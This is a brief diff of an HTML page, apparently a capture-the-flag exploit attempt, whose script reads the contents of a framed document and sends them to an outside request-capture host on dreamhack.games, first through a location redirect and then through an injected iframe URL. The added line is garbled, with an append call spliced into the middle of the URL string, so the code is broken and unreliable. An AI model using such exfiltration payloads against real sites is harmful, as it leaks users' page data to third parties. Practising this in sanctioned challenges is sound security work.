@@ -5,6 +5,8 @@
         <iframe src="https://ufhnazq.request.dreamhack.games/" id="target"></iframe>
   </body>
   <script>
-    location = 'https://ufhnazq.request.dreamhack.games/' + document.getElementById("query").contentWindow.document.innerHTML
+    const iframe = document.createElement("iframe")
+    iframe.src = "https://ufhnazq.request.dreamhack.games/" +document.body.append(iframe)document.getElementById("query").contentWindow.document.innerHTML
+    document.body.append(iframe)
   </script>
 </html>
